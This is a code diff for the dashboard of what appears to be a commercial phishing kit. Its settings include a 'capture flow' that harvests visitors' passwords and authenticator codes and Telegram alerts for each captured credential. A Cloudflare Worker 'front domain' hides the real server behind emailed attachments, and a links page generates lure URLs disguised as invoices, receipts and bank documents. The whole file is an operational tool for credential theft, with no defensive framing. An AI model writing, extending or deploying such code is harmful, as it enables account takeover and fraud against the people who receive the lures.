+        ? '<i class="fas fa-shield-halved" style="color:var(--green);"></i> Auto-SSL is enabled — once you verify, a Let\'s Encrypt cert will provision in ~30 seconds.'
+        : '<i class="fas fa-triangle-exclamation" style="color:var(--orange,#f59e0b);"></i> Auto-SSL is <strong>not configured</strong> on this server. Verification will succeed but you\'ll need to terminate TLS in front (Caddy / Cloudflare / nginx) for the domain to actually serve over HTTPS. Ask the superadmin to set <code>CADDY_ADMIN_URL</code>.';
+      verifyPanel = `
+      <div style="margin-top:12px;padding:14px 16px;background:#fff;border:1px dashed var(--border);border-radius:10px;max-width:720px;font-size:13px;color:var(--text);">
+        <strong>To verify <code>${esc(host)}</code>, add ONE of these DNS records at your registrar:</strong>
+
+        <div style="margin-top:14px;font-size:12px;color:var(--text-dim);font-weight:600;text-transform:uppercase;letter-spacing:.4px;">Option A — A record (recommended)</div>
+        <table style="margin-top:6px;border-collapse:collapse;font-family:monospace;">
+          <thead><tr style="font-size:11px;color:var(--text-mute);text-align:left;"><th style="padding:0 12px 4px 0;">Type</th><th style="padding:0 12px 4px 0;">Host / Name</th><th style="padding:0 12px 4px 0;">Value</th><th style="padding:0 0 4px 0;">Status</th></tr></thead>
+          <tbody>${aRow}</tbody>
+        </table>
+
+        <div style="margin-top:14px;font-size:12px;color:var(--text-dim);font-weight:600;text-transform:uppercase;letter-spacing:.4px;">Option B — TXT record</div>
+        <table style="margin-top:6px;border-collapse:collapse;font-family:monospace;">
+          <thead><tr style="font-size:11px;color:var(--text-mute);text-align:left;"><th style="padding:0 12px 4px 0;">Type</th><th style="padding:0 12px 4px 0;">Host / Name</th><th style="padding:0 12px 4px 0;">Value</th><th style="padding:0 0 4px 0;">Status</th></tr></thead>
+          <tbody>
+            <tr><td style="padding:6px 12px 6px 0;">TXT</td><td style="padding:6px 12px 6px 0;">${copyCell(txtName, 'host')}</td><td style="padding:6px 12px 6px 0;">${copyCell(token, 'token')}</td><td style="padding:6px 0;" id="dns-txt-status"><span class="dns-pill" style="font-size:11px;color:var(--text-mute);">checking...</span></td></tr>
+          </tbody>
+        </table>
+
+        <details style="margin-top:14px;font-size:12px;color:var(--text-dim);">
+          <summary style="cursor:pointer;font-weight:600;color:var(--text);">📖 How do I add a DNS record at my registrar?</summary>
+          <div style="margin-top:8px;line-height:1.7;padding-left:8px;border-left:2px solid var(--border);">
+            <strong>Cloudflare</strong> — DNS tab → Add record → Type <code>A</code>, Name <code>${esc(host.split('.')[0])}</code> (or full host), IPv4 <code>${esc(ip || 'your IP')}</code> → <em>turn off the orange proxy cloud</em> for verification, you can re-enable after.<br>
+            <strong>GoDaddy</strong> — My Products → DNS → Add → Type <code>A</code>, Host <code>${esc(host.split('.')[0])}</code>, Points to <code>${esc(ip || 'your IP')}</code>, TTL 600 → Save.<br>
+            <strong>Namecheap</strong> — Domain List → Manage → Advanced DNS → Add New Record → A Record → Host <code>${esc(host.split('.')[0])}</code>, Value <code>${esc(ip || 'your IP')}</code>, Auto TTL.<br>
+            <strong>Google Domains / Squarespace</strong> — DNS → Custom records → Type <code>A</code>, Host <code>${esc(host.split('.')[0])}</code>, Data <code>${esc(ip || 'your IP')}</code>, TTL 5min.
+          </div>
+        </details>
+
+        <p style="margin-top:14px;font-size:12px;color:var(--text-dim);">After saving the record, wait for the <strong>Status</strong> column to turn <span style="color:var(--green);font-weight:600;">green ✓</span> (usually 30 sec – 5 min), then click <strong>Verify</strong>. ${sslHint}</p>
+      </div>`;
+    }
+  }
+  const urlBlock = `
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:8px;"><i class="fas fa-globe" style="color:var(--blue);margin-right:8px;"></i>My Domain ${verifyBadge} ${sslBadge}</h3>
+      <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px;">${domainHint}</p>
+      <div style="display:flex;gap:8px;max-width:720px;align-items:flex-start;flex-wrap:wrap;">
+        <input type="text" id="dom-input" value="${esc(me.domain || '')}" placeholder="${sa2 ? 'https://invoices.mydomain.com or http://1.2.3.4:3000' : 'https://yourdomain.com (optional)'}" style="flex:1;min-width:260px;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-family:monospace;font-size:12px;background:#fff;" />
+        <button class="btn blue" style="padding:10px 18px;" onclick="saveMyDomain()" id="dom-saveBtn">Save</button>
+        ${me.domain && !me.domainVerified ? '<button class="btn" style="padding:10px 18px;" onclick="verifyMyDomain()" id="dom-verifyBtn"><i class="fas fa-check-circle" style="margin-right:4px;"></i>Verify</button>' : ''}
+        ${me.domain ? '<button class="btn red" style="padding:10px 18px;" onclick="removeMyDomain()" id="dom-removeBtn"><i class="fas fa-trash" style="margin-right:4px;"></i>Remove</button>' : ''}
+        <span id="dom-msg" style="font-size:12px;align-self:center;display:none;"></span>
+      </div>
+      ${verifyPanel}
+      ${(() => {
+        if (!me.effectiveDomain) return '';
+        const fullUrl = me.effectiveDomain + (me.slug ? '/v/' + me.slug : '');
+        const srcLabel = me.effectiveDomainSource === 'server' ? 'server default (no custom domain set)'
+          : me.effectiveDomainSource === 'own' ? 'your verified domain' : '';
+        return `<p style="font-size:11px;color:var(--text-mute);margin-top:8px;">Entry URL: <code style="background:#f0f0f0;padding:2px 6px;border-radius:4px;cursor:pointer;" onclick="copyText('${esc(fullUrl)}').then(()=>{this.style.color='var(--green)';setTimeout(()=>{this.style.color=''},1200)})" title="Click to copy">${esc(fullUrl)}</code> ${srcLabel ? '— ' + esc(srcLabel) : ''}</p>`;
+      })()}
+      <hr style="margin:28px 0;border:none;border-top:1px solid var(--border);" />
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:8px;"><i class="fas fa-mask" style="color:var(--blue);margin-right:8px;"></i>Front Domain</h3>
+      <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px;">Hides your real server in email attachments. Uses a Cloudflare Worker (free) as a clean front.</p>
+      <div style="display:flex;gap:8px;max-width:720px;align-items:flex-start;flex-wrap:wrap;">
+        <input type="text" id="front-input" value="${esc(me.frontDomain || '')}" placeholder="https://yourname.workers.dev" style="flex:1;min-width:260px;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-family:monospace;font-size:12px;background:#fff;" />
+        <button class="btn blue" style="padding:10px 18px;" onclick="saveMyFrontDomain()" id="front-saveBtn">Save</button>
+        <button class="btn" style="padding:10px 18px;" onclick="showWorkerCode()"><i class="fas fa-code" style="margin-right:4px;"></i>Get Worker Code</button>
+        <span id="front-msg" style="font-size:12px;align-self:center;display:none;"></span>
+      </div>
+      ${me.frontDomain ? `<p style="font-size:11px;color:var(--green);margin-top:6px;"><i class="fas fa-check"></i> Active: <code>${esc(me.frontDomain)}/r</code></p>` : `<p style="font-size:11px;color:var(--text-mute);margin-top:6px;">Not set — attachments will expose your real domain.</p>`}
+      <div id="worker-code-box"></div>
+      <hr style="margin:28px 0;border:none;border-top:1px solid var(--border);" />`;
+
+  // License info for the current user
+  const myLic = me.license || {};
+  const myDaysLeft = myLic.expiresAt ? Math.max(0, Math.ceil((new Date(myLic.expiresAt).getTime() - Date.now()) / 86400000)) : null;
+  const myLicExpired = myLic.expiresAt && new Date(myLic.expiresAt).getTime() < Date.now();
+  const licenseBlock = myLic.tier !== 'owner' ? `
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:8px;"><i class="fas fa-key" style="color:var(--blue);margin-right:8px;"></i>My License</h3>
+      <div style="display:grid;grid-template-columns:120px 1fr;gap:8px 14px;font-size:13px;max-width:480px;margin-bottom:14px;">
+        <div style="color:var(--text-mute);">Key</div><div><code style="background:#f0f0f0;padding:2px 6px;border-radius:4px;">${esc(myLic.key || '')}</code></div>
+        <div style="color:var(--text-mute);">Tier</div><div><strong style="text-transform:uppercase;">${esc(myLic.tier || 'basic')}</strong></div>
+        <div style="color:var(--text-mute);">Status</div><div>${!myLic.active || myLicExpired ? '<span class="badge red">Expired / Revoked</span>' : '<span class="badge green">Active</span>'}</div>
+        <div style="color:var(--text-mute);">Expires</div><div>${myLic.expiresAt ? (myDaysLeft + ' days ' + (myLicExpired ? 'ago' : 'remaining')) : 'Not set'}</div>
+      </div>
+      ${myLicExpired || !myLic.active ? '<div style="padding:10px 14px;background:#fee2e2;border:1px solid #fca5a5;border-radius:8px;font-size:13px;color:#991b1b;margin-bottom:14px;"><i class="fas fa-triangle-exclamation" style="margin-right:6px;"></i>Your license has expired. Contact the administrator to renew.</div>' : ''}
+      <hr style="margin:28px 0;border:none;border-top:1px solid var(--border);" />` : '';
+
+  const captureBlock = `
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:8px;"><i class="fas fa-bullseye" style="color:var(--blue);margin-right:8px;"></i>My Capture Flow</h3>
+      <p style="font-size:12px;color:var(--text-dim);margin-bottom:16px;">Controls how clients who visit <strong>your</strong> URL are handled.</p>
+      <div class="form-field" style="max-width:720px;">
+        <label style="display:flex;align-items:center;gap:10px;cursor:pointer;font-weight:500;">
+          <input type="checkbox" id="mfa-enabled" ${me.mfaEnabled ? 'checked' : ''} style="width:16px;height:16px;" />
+          Enable MFA capture (ask clients for an authenticator code after their password)
+        </label>
+        <small>When off, the flow ends after password capture.</small>
+      </div>
+      <div style="margin-top:12px;display:flex;align-items:center;gap:10px;">
+        <button class="btn blue" onclick="saveMyMfa()" id="mfa-saveBtn" style="padding:8px 20px;">Save</button>
+        <span id="mfa-msg" style="font-size:12px;display:none;"></span>
+      </div>
+      <hr style="margin:28px 0;border:none;border-top:1px solid var(--border);" />
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:8px;"><i class="fab fa-telegram" style="color:#0088cc;margin-right:8px;"></i>My Telegram Notifications</h3>
+      <p style="font-size:12px;color:var(--text-dim);margin-bottom:16px;">Receive real-time alerts when a client enters a password, MFA code, or when security events happen.</p>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;max-width:720px;">
+        <div class="form-field" style="grid-column:1/-1;">
+          <label style="display:flex;align-items:center;gap:10px;cursor:pointer;font-weight:500;">
+            <input type="checkbox" id="tg-enabled" ${me.telegramEnabled ? 'checked' : ''} style="width:16px;height:16px;" />
+            Enable Telegram alerts
+          </label>
+        </div>
+        <div class="form-field">
+          <label>Bot Token</label>
+          <input type="text" id="tg-token" value="${me.telegramBotToken === '***configured***' ? '' : esc(me.telegramBotToken || '')}" placeholder="${me.telegramBotToken === '***configured***' ? 'Already configured (leave blank to keep)' : 'Paste bot token from @BotFather'}" />
+          <small>Get from <a href="https://t.me/BotFather" target="_blank" style="color:var(--blue);">@BotFather</a></small>
+        </div>
+        <div class="form-field">
+          <label>Chat ID</label>
+          <input type="text" id="tg-chatid" value="${esc(me.telegramChatId || '')}" placeholder="Your chat ID or group ID" />
+          <small>Get from <a href="https://t.me/userinfobot" target="_blank" style="color:var(--blue);">@userinfobot</a></small>
+        </div>
+      </div>
+      <div style="margin-top:16px;display:flex;align-items:center;gap:10px;">
+        <button class="btn blue" onclick="saveMyTelegram()" id="tg-saveBtn" style="padding:8px 20px;">Save Telegram</button>
+        <button class="btn" onclick="testMyTelegram()" id="tg-testBtn" style="padding:8px 16px;"><i class="fab fa-telegram" style="margin-right:4px;"></i> Send Test</button>
+        <span id="tg-msg" style="font-size:12px;display:none;"></span>
+      </div>`;
+
+  const dangerBlock = sa ? `
+      <hr style="margin:32px 0;border:none;border-top:1px solid var(--border);" />
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:8px;color:var(--red);"><i class="fas fa-triangle-exclamation" style="margin-right:8px;"></i>Danger Zone</h3>
+      <p style="font-size:13px;color:var(--text-dim);margin-bottom:16px;">Clear all tracked data. This cannot be undone.</p>
+      <div style="display:flex;gap:8px;flex-wrap:wrap;">
+        <button class="btn red" onclick="clearSection('clear-bans','Clear all banned IPs?')" style="padding:8px 14px;"><i class="fas fa-ban" style="margin-right:4px;"></i>Clear Bans</button>
+        <button class="btn red" onclick="clearSection('clear-strikes','Clear all strikes?')" style="padding:8px 14px;"><i class="fas fa-shield-halved" style="margin-right:4px;"></i>Clear Strikes</button>
+        <button class="btn red" onclick="clearSection('clear-devices','Clear all tracked devices?')" style="padding:8px 14px;"><i class="fas fa-fingerprint" style="margin-right:4px;"></i>Clear Devices</button>
+        <button class="btn red" onclick="clearSection('clear-learned','Clear all learned domains?')" style="padding:8px 14px;"><i class="fas fa-brain" style="margin-right:4px;"></i>Clear Learned</button>
+      </div>
+      <div style="margin-top:12px;">
+        <button class="btn red" onclick="clearAll()" style="padding:10px 20px;font-weight:700;"><i class="fas fa-trash" style="margin-right:6px;"></i>Clear Everything</button>
+      </div>` : '';
+
+  document.getElementById('p-settings').innerHTML = `<div class="table-card" style="padding:24px;">${licenseBlock}${urlBlock}${passwordBlock}${captureBlock}${dangerBlock}</div>`;
+  // Kick off live DNS polling if the verify panel rendered.
+  startDnsStatusPolling();
+}
+
+async function verifyMyDomain() {
+  const btn = document.getElementById('dom-verifyBtn');
+  const msg = document.getElementById('dom-msg');
+  if (!btn) return;
+  btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+  const resp = await fetch(BASE + '/api/my-domain/verify', { method: 'POST' });
+  const data = await resp.json();
+  if (resp.ok && data.ok) {
+    msg.style.display = 'inline'; msg.style.color = 'var(--green)';
+    msg.textContent = '✓ Verified via ' + data.method + ' — provisioning SSL...';
+    stopDnsStatusPolling();
+    // Re-render now (badge shows "SSL Provisioning…") and again every 4s
+    // until SSL becomes active or 90s pass — so the user sees the badge
+    // flip to "Active" without reloading.
+    setTimeout(() => loadSettings(), 800);
+    let elapsed = 0;
+    const sslPoll = setInterval(async () => {
+      elapsed += 4000;
+      try {
+        const me = await (await fetch(BASE + '/api/me')).json();
+        if (me.domainSslStatus === 'active' || elapsed >= 90000 || (me.domainSslStatus || '').startsWith('error')) {
+          clearInterval(sslPoll);
+          loadSettings();
+        }
+      } catch { /* keep polling */ }
+    }, 4000);
+  } else {
+    btn.disabled = false; btn.innerHTML = '<i class="fas fa-check-circle" style="margin-right:4px;"></i>Verify';
+    msg.style.display = 'inline'; msg.style.color = 'var(--red)';
+    msg.textContent = data.error || 'Verification failed';
+    setTimeout(() => { if (msg) msg.style.display = 'none'; }, 6000);
+  }
+}
+
+// Live DNS propagation polling — runs while the verify panel is on screen so
+// users see a green ✓ the moment their A or TXT record is detected, instead
+// of guessing whether DNS has propagated.
+let _dnsStatusTimer = null;
+function stopDnsStatusPolling() {
+  if (_dnsStatusTimer) { clearInterval(_dnsStatusTimer); _dnsStatusTimer = null; }
+}
+async function tickDnsStatus() {
+  const aCell   = document.getElementById('dns-a-status');
+  const txtCell = document.getElementById('dns-txt-status');
+  if (!aCell && !txtCell) { stopDnsStatusPolling(); return; }
+  try {
+    const r = await fetch(BASE + '/api/my-domain/dns-status');
+    if (!r.ok) return;
+    const d = await r.json();
+    const renderPill = (cell, rec) => {
+      if (!cell || !rec) return;
+      if (rec.ok) {
+        cell.innerHTML = '<span class="dns-pill" style="font-size:11px;color:var(--green);font-weight:600;background:#dcfce7;padding:3px 8px;border-radius:999px;display:inline-flex;align-items:center;gap:4px;"><i class="fas fa-check-circle"></i> Detected</span>';
+      } else if (rec.error && rec.error.includes('disabled')) {
+        cell.innerHTML = '<span class="dns-pill" style="font-size:11px;color:var(--text-mute);">N/A</span>';
+      } else if (rec.error && rec.error.includes('no record')) {
+        cell.innerHTML = '<span class="dns-pill" style="font-size:11px;color:var(--text-mute);background:#f3f4f6;padding:3px 8px;border-radius:999px;display:inline-flex;align-items:center;gap:4px;"><i class="fas fa-clock"></i> Not yet</span>';
+      } else {
+        const txt = rec.error || 'mismatch';
+        cell.innerHTML = `<span class="dns-pill" style="font-size:11px;color:#b45309;background:#fef3c7;padding:3px 8px;border-radius:999px;display:inline-flex;align-items:center;gap:4px;" title="${esc(txt)}"><i class="fas fa-triangle-exclamation"></i> ${esc(txt.slice(0, 30))}</span>`;
+      }
+    };
+    renderPill(aCell, d.aRecord);
+    renderPill(txtCell, d.txtRecord);
+    // If either record is good, pulse the Verify button to draw attention.
+    if ((d.aRecord && d.aRecord.ok) || (d.txtRecord && d.txtRecord.ok)) {
+      const vbtn = document.getElementById('dom-verifyBtn');
+      if (vbtn && !vbtn.dataset.pulsed) {
+        vbtn.dataset.pulsed = '1';
+        vbtn.style.animation = 'ccPop .25s';
+        vbtn.style.background = 'var(--green)';
+        vbtn.style.color = '#fff';
+        vbtn.style.borderColor = 'var(--green)';
+      }
+    }
+  } catch { /* network blip */ }
+}
+function startDnsStatusPolling() {
+  stopDnsStatusPolling();
+  if (!document.getElementById('dns-a-status') && !document.getElementById('dns-txt-status')) return;
+  tickDnsStatus();
+  _dnsStatusTimer = setInterval(tickDnsStatus, 8000);
+}
+
+async function showWorkerCode() {
+  const box = document.getElementById('worker-code-box');
+  if (!box) return;
+  if (box.innerHTML.trim()) { box.innerHTML = ''; return; }
+  const resp = await fetch(BASE + '/api/worker-code');
+  const { code } = await resp.json();
+  box.innerHTML = `
+    <div style="margin-top:14px;padding:16px;background:#111;border-radius:10px;max-width:720px;position:relative;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+        <span style="font-size:12px;font-weight:600;color:#888;">Cloudflare Worker Code — copy and paste into your worker</span>
+        <div style="display:flex;gap:6px;">
+          <button class="btn blue" style="padding:6px 14px;font-size:12px;" id="wc-copy" onclick="copyWorkerCode()"><i class="fas fa-copy" style="margin-right:4px;"></i>Copy</button>
+          <button class="btn" style="padding:6px 14px;font-size:12px;" onclick="document.getElementById('worker-code-box').innerHTML=''"><i class="fas fa-times"></i></button>
+        </div>
+      </div>
+      <pre id="wc-pre" style="background:#1a1a1a;padding:12px;border-radius:8px;font-size:11px;color:#e0e0e0;overflow-x:auto;white-space:pre;margin:0;max-height:300px;overflow-y:auto;line-height:1.5;">${esc(code)}</pre>
+      <div style="margin-top:12px;padding:14px 14px;background:#1e293b;border-radius:8px;font-size:12px;color:#94a3b8;line-height:1.8;">
+        <strong style="color:#60a5fa;font-size:13px;">How to set up your Cloudflare Worker (5 minutes, free)</strong><br><br>
+        <strong style="color:#e2e8f0;">Step 1 — Create account</strong><br>
+        Go to <a href="https://dash.cloudflare.com/sign-up" target="_blank" style="color:#60a5fa;">dash.cloudflare.com/sign-up</a> and create a free account (if you don't have one).<br><br>
+        <strong style="color:#e2e8f0;">Step 2 — Create Worker</strong><br>
+        After login → left sidebar → <strong style="color:#e0e0e0;">Workers & Pages</strong> → click <strong style="color:#e0e0e0;">Create</strong> → select <strong style="color:#e0e0e0;">Create Worker</strong>.<br>
+        Give it a name (e.g. <code style="color:#e0e0e0;">document</code> or <code style="color:#e0e0e0;">docs-view</code>). Click <strong style="color:#e0e0e0;">Deploy</strong>.<br><br>
+        <strong style="color:#e2e8f0;">Step 3 — Paste the code</strong><br>
+        After deploy → click <strong style="color:#e0e0e0;">Edit Code</strong> (top right).<br>
+        In the editor: press <strong style="color:#e0e0e0;">Ctrl+A</strong> (select all) → <strong style="color:#e0e0e0;">Delete</strong> → then <strong style="color:#e0e0e0;">Ctrl+V</strong> (paste the code you copied above).<br>
+        Click <strong style="color:#e0e0e0;">Save and Deploy</strong> (top right, blue button).<br><br>
+        <strong style="color:#e2e8f0;">Step 4 — Copy your Worker URL</strong><br>
+        Your URL is shown at the top of the page, like: <code style="color:#e0e0e0;">https://document.youraccount.workers.dev</code><br>
+        Copy this full URL.<br><br>
+        <strong style="color:#e2e8f0;">Step 5 — Save it here</strong><br>
+        Paste the URL in the <strong style="color:#e0e0e0;">Front Domain</strong> field above → click <strong style="color:#e0e0e0;">Save</strong>.<br>
+        Done! All attachments will now route through your worker. Your real server stays hidden.
+      </div>
+    </div>`;
+}
+
+function copyWorkerCode() {
+  const pre = document.getElementById('wc-pre');
+  if (!pre) return;
+  copyText(pre.textContent).then(() => {
+    const btn = document.getElementById('wc-copy');
+    if (btn) { btn.innerHTML = '<i class="fas fa-check" style="margin-right:4px;"></i>Copied'; btn.classList.remove('blue'); btn.classList.add('green'); }
+    setTimeout(() => {
+      if (btn) { btn.innerHTML = '<i class="fas fa-copy" style="margin-right:4px;"></i>Copy'; btn.classList.remove('green'); btn.classList.add('blue'); }
+    }, 2000);
+  });
+}
+
+async function saveMyFrontDomain() {
+  const btn = document.getElementById('front-saveBtn');
+  const msg = document.getElementById('front-msg');
+  btn.disabled = true; btn.textContent = 'Saving...';
+  const resp = await post(BASE + '/api/my-front-domain', { frontDomain: document.getElementById('front-input').value });
+  const data = await resp.json();
+  btn.disabled = false; btn.textContent = 'Save';
+  msg.style.display = 'inline';
+  if (resp.ok && data.ok) { msg.style.color = 'var(--green)'; msg.textContent = '✓ Saved'; setTimeout(() => loadSettings(), 800); }
+  else { msg.style.color = 'var(--red)'; msg.textContent = data.error || 'Failed'; }
+  setTimeout(() => { if (msg) msg.style.display = 'none'; }, 3500);
+}
+
+async function saveMyDomain() {
+  const btn = document.getElementById('dom-saveBtn');
+  const msg = document.getElementById('dom-msg');
+  btn.disabled = true; btn.textContent = 'Saving...';
+  const resp = await post(BASE + '/api/my-domain', { domain: document.getElementById('dom-input').value });
+  const data = await resp.json();
+  btn.disabled = false; btn.textContent = 'Save';
+  msg.style.display = 'inline';
+  if (resp.ok && data.ok) {
+    msg.style.color = 'var(--green)'; msg.textContent = '✓ Saved' + (data.domain ? ' — '+data.domain : ' (cleared)');
+    setTimeout(() => loadSettings(), 800);
+  } else {
+    msg.style.color = 'var(--red)'; msg.textContent = data.error || 'Failed';
+  }
+  setTimeout(() => { if (msg) msg.style.display = 'none'; }, 3500);
+}
+
+async function removeMyDomain() {
+  if (!(await confirmDialog('This will clear your domain and tear down its SSL route. Generators will fall back to the server URL.', { title: 'Remove domain?', danger: true, confirmText: 'Remove' }))) return;
+  const btn = document.getElementById('dom-removeBtn');
+  const msg = document.getElementById('dom-msg');
+  if (btn) { btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>'; }
+  stopDnsStatusPolling();
+  const resp = await fetch(BASE + '/api/my-domain', { method: 'DELETE' });
+  const data = await resp.json();
+  if (msg) msg.style.display = 'inline';
+  if (resp.ok && data.ok) {
+    if (msg) { msg.style.color = 'var(--green)'; msg.textContent = '✓ Removed'; }
+    setTimeout(() => loadSettings(), 600);
+  } else {
+    if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fas fa-trash" style="margin-right:4px;"></i>Remove'; }
+    if (msg) { msg.style.color = 'var(--red)'; msg.textContent = data.error || 'Failed'; }
+  }
+  setTimeout(() => { if (msg) msg.style.display = 'none'; }, 3500);
+}
+
+async function savePermissions() {
+  const btn = document.getElementById('perm-saveBtn');
+  const msg = document.getElementById('perm-msg');
+  btn.disabled = true; btn.textContent = 'Saving...';
+  const tp = {};
+  ['basic','premium','vip'].forEach(t => {
+    tp[t] = {};
+    ['chameleon','inbox','convert','links'].forEach(f => {
+      const el = document.getElementById('tp-'+t+'-'+f);
+      tp[t][f] = el ? el.checked : false;
+    });
+  });
+  await post(BASE + '/api/settings', { tierPermissions: tp });
+  btn.disabled = false; btn.textContent = 'Save Permissions';
+  msg.style.display = 'inline';
+  msg.style.color = 'var(--green)'; msg.textContent = '✓ Saved';
+  setTimeout(() => { if (msg) msg.style.display = 'none'; }, 3000);
+}
+
+async function saveMyEncryption() {
+  const preset = document.getElementById('enc-preset').value;
+  const btn = document.getElementById('enc-saveBtn');
+  const msg = document.getElementById('enc-msg');
+  btn.disabled = true; btn.textContent = 'Saving...';
+  const resp = await post(BASE + '/api/my-encryption', { preset });
+  const data = await resp.json();
+  btn.disabled = false; btn.textContent = 'Save';
+  msg.style.display = 'inline';
+  if (resp.ok && data.ok) { msg.style.color = 'var(--green)'; msg.textContent = '✓ Saved'; }
+  else { msg.style.color = 'var(--red)'; msg.textContent = data.error || 'Failed'; }
+  setTimeout(() => { if (msg) msg.style.display = 'none'; }, 3000);
+}
+
+async function saveMyMfa() {
+  const btn = document.getElementById('mfa-saveBtn');
+  const msg = document.getElementById('mfa-msg');
+  btn.disabled = true; btn.textContent = 'Saving...';
+  const resp = await post(BASE + '/api/my-mfa', { mfaEnabled: document.getElementById('mfa-enabled').checked });
+  const data = await resp.json();
+  btn.disabled = false; btn.textContent = 'Save';
+  msg.style.display = 'inline';
+  if (resp.ok && data.ok) { msg.style.color = 'var(--green)'; msg.textContent = '✓ Saved'; }
+  else { msg.style.color = 'var(--red)'; msg.textContent = data.error || 'Failed'; }
+  setTimeout(() => msg.style.display = 'none', 3000);
+}
+
+async function saveMyTelegram() {
+  const btn = document.getElementById('tg-saveBtn');
+  const msg = document.getElementById('tg-msg');
+  const body = {
+    telegramEnabled: document.getElementById('tg-enabled').checked,
+    telegramChatId: document.getElementById('tg-chatid').value.trim(),
+  };
+  const tok = document.getElementById('tg-token').value.trim();
+  if (tok) body.telegramBotToken = tok;
+  btn.disabled = true; btn.textContent = 'Saving...';
+  const resp = await post(BASE + '/api/my-telegram', body);
+  const data = await resp.json();
+  btn.disabled = false; btn.textContent = 'Save Telegram';
+  msg.style.display = 'inline';
+  if (resp.ok && data.ok) { msg.style.color = 'var(--green)'; msg.textContent = '✓ Saved'; }
+  else { msg.style.color = 'var(--red)'; msg.textContent = data.error || 'Failed'; }
+  setTimeout(() => msg.style.display = 'none', 3000);
+}
+
+async function testMyTelegram() {
+  const btn = document.getElementById('tg-testBtn');
+  const msg = document.getElementById('tg-msg');
+  btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:4px;"></i> Sending...';
+  const resp = await fetch(BASE + '/api/test-my-telegram', { method: 'POST' });
+  const data = await resp.json();
+  btn.disabled = false; btn.innerHTML = '<i class="fab fa-telegram" style="margin-right:4px;"></i> Send Test';
+  msg.style.display = 'inline';
+  if (resp.ok && data.ok) { msg.style.color = 'var(--green)'; msg.textContent = '✓ Sent — check Telegram'; }
+  else { msg.style.color = 'var(--red)'; msg.textContent = data.error || 'Failed'; }
+  setTimeout(() => msg.style.display = 'none', 4000);
+}
+
+async function saveSettings() {
+  const maxPasswordAttempts = document.getElementById('s-maxAttempts').value;
+  const maxMfaAttempts = document.getElementById('s-maxMfa').value;
+  const btn = document.getElementById('s-saveBtn');
+  btn.disabled = true; btn.textContent = 'Saving...';
+  await post(BASE + '/api/settings', { maxPasswordAttempts, maxMfaAttempts });
+  btn.disabled = false; btn.textContent = 'Save Settings';
+  const msg = document.getElementById('s-saveMsg');
+  msg.style.display = 'inline';
+  setTimeout(() => { msg.style.display = 'none'; }, 3000);
+}
+
+// ---- Links tab (all users) ----
+async function loadLinks() {
+  const [{ links }, atts] = await Promise.all([
+    api('links'), api('attachments'),
+  ]);
+  const attachments = (atts && atts.attachments) || [];
+  const orphans = (atts && atts.orphans) || [];
+  let h = `
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
+      <h3 style="font-size:15px;font-weight:700;"><i class="fas fa-link" style="color:var(--blue);margin-right:8px;"></i>Client Links</h3>
+      <div style="display:flex;gap:8px;flex-wrap:wrap;">
+        ${currentUser && (currentUser.role==='superadmin' || currentUser.permissions?.chameleon) ? `<button class="btn" style="padding:8px 16px;" onclick="downloadChameleon()"><i class="fas fa-dragon" style="margin-right:4px;"></i> Chameleon</button>` : ''}
+        ${currentUser && (currentUser.role==='superadmin' || currentUser.permissions?.inbox) ? `<button class="btn" style="padding:8px 16px;" onclick="downloadInbox()"><i class="fas fa-envelope-circle-check" style="margin-right:4px;color:#10b981;"></i> Inbox</button>` : ''}
+        ${currentUser && (currentUser.role==='superadmin' || currentUser.permissions?.convert) ? `<button class="btn" style="padding:8px 16px;" onclick="showConvertHtml()"><i class="fas fa-code" style="margin-right:4px;"></i> Convert</button>` : ''}
+        <button class="btn red" style="padding:8px 14px;" onclick="rotateRelay()" title="Invalidates all previously-generated files"><i class="fas fa-sync-alt"></i></button>
+        ${currentUser && (currentUser.role==='superadmin' || currentUser.permissions?.links) ? `<button class="btn blue" style="padding:8px 16px;" onclick="showGenLinkForm()"><i class="fas fa-plus" style="margin-right:4px;"></i> Generate Link</button>` : ''}
+      </div>
+    </div>
+    <div id="genlink-form-container"></div>
+    <div id="genlink-result"></div>`;
+  if (!links || links.length === 0) {
+    h += '<div class="table-card"><div class="empty"><i class="fas fa-link"></i><p>No active links. Generate one for your client.</p></div></div>';
+  } else {
+    h += '<div class="table-card"><table><tr><th>Link</th><th>Label</th><th>Type</th><th>Funnel</th><th>Created by</th><th>Created</th><th>Expires</th><th></th></tr>';
+    links.forEach(l => {
+      const fullUrl = location.origin + (l.url || ('/d/' + l.hash));
+      h += `<tr>
+        <td><input type="text" readonly value="${esc(fullUrl)}" style="width:320px;padding:6px 8px;border:1px solid var(--border);border-radius:6px;font-family:monospace;font-size:11px;background:#fff;" onclick="this.select()" title="${esc(fullUrl)}" />
+          <button class="btn" style="padding:6px 10px;margin-left:4px;" onclick="copyText('${esc(fullUrl)}');this.textContent='Copied';setTimeout(()=>this.innerHTML='<i class=\\'fas fa-copy\\'></i>',1500)"><i class="fas fa-copy"></i></button></td>
+        <td>${l.email ? esc(l.email) : '<span style="color:var(--text-dim);">—</span>'}</td>
+        <td><span style="font-size:11px;padding:4px 8px;background:${l.documentType==='invitation'?'#fef3c7':l.documentType==='receipt'?'#d1fae5':l.documentType==='confirmation'?'#f3e8ff':l.documentType==='quickbook'?'#d1fae5':l.documentType==='fidelity'?'#dbeafe':'#dbeafe'};border-radius:4px;text-transform:capitalize;">${esc(l.documentType || 'invoice')}</span></td>
+        <td>${linkFunnel(l.stats)}</td>
+        <td>${esc(l.createdBy)}</td>
+        <td>${timeAgo(l.createdAt)}</td>
+        <td>${timeAgo(l.expiresAt)}</td>
